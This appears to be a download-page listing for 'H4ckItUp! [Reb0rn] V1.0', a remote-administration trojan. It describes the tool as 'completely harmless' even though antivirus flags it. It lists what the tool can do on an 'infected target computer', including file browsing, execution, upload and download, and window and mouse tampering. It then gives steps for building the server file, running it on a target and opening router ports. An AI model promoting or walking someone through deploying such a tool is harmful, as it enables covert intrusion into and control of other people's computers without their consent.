title: H4ckItUp! [Reb0rn] V1.0
description:
This is H4ckItUp! [Reb0rn] V1.0. I was able to snag this from robelirobban&#039;s site before it was shut down. This is the most current release avaliable. Here is a little info about it.

NOTE: most virus protection programs will think this is a virus. However it is completely harmless to your computer. You are in full control of everything it does. You can run the Antidote.exe file on the infected target computer to remove this at anytime.

- H4ckItUp! is a tool for connecting to other computers via the Internet but it also works via a LAN. Whilst connected to a computer you take control over it and can perform, for example, filemanagement.


Current functions:
- Open/Close Cd-Tray.
- Restart/Log out/Shut down computer.
- Restart/Stop/Remove server.
- Send customizeable popups.
- See and tamper with the active window (Close/Minimize/Freeze).
- Freeze and Unfreeze the mouse.
- Filebrowser, (in which you can Delete/Rename/Execute/Download/Upload files).
- Look at systeminfo about the computer.


To use H4ckItUp!.

1. Extract the RAR file
2. Run Distributor.exe and fill out the ip address of YOUR computer
3. Use the file it creates in the Release folder and run it on your target computer
4. Use the H4ckItUp!.exe on YOUR computer to monitor and control your target computer whenever it is online
5. you will need to make sure you open the correct ports on your router for this to work over the internet. read the included README for more information
